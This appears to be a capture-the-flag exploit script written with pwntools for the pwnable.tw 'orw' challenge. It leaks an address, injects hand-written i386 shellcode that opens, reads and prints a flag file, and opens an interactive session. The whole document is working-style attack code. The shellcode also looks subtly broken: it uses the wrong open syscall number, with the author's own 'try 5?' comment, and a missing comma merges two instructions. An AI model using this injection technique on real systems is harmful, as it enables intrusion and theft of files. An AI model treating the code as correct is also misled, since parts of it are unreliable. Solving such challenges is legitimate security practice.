#!/usr/bin/python3
from pwn import *
import sys
elf = context.binary = ELF('orw')
context.arch = 'i386'
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('chall.pwnable.tw', 10001)
##############################
io = start()
# call write to write to where $eip points
print(io.recv(23))
io.send(b'\x90' + p32(elf.sym['read']))
leak = u32(io.recv()[:4])
log.info(f"leak {hex(leak)}")
shellcode = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'),
    'xor ecx, ecx',
    'xor edx, edx',
    'mov ebx, esp',
    'mov eax, 2', # try 5?
    'int 0x80',
    # read
    'push eax',
    'mov eax, 3',
    'pop ebx',
    'mov ecx, 0x0804a060',
    'add ecx, 160',
    'mov edx, 40'
    'int 0x80',
    # write
    'mov eax, 4',
    'mov ebx, 1',
    'mov ecx, 0x0804a060',
    'add ecx, 160',
    'mov edx, 40',
    'int 0x80'
]))
io.send(b'\x90' + p32(leak+4) + shellcode)
io.interactive()
##############################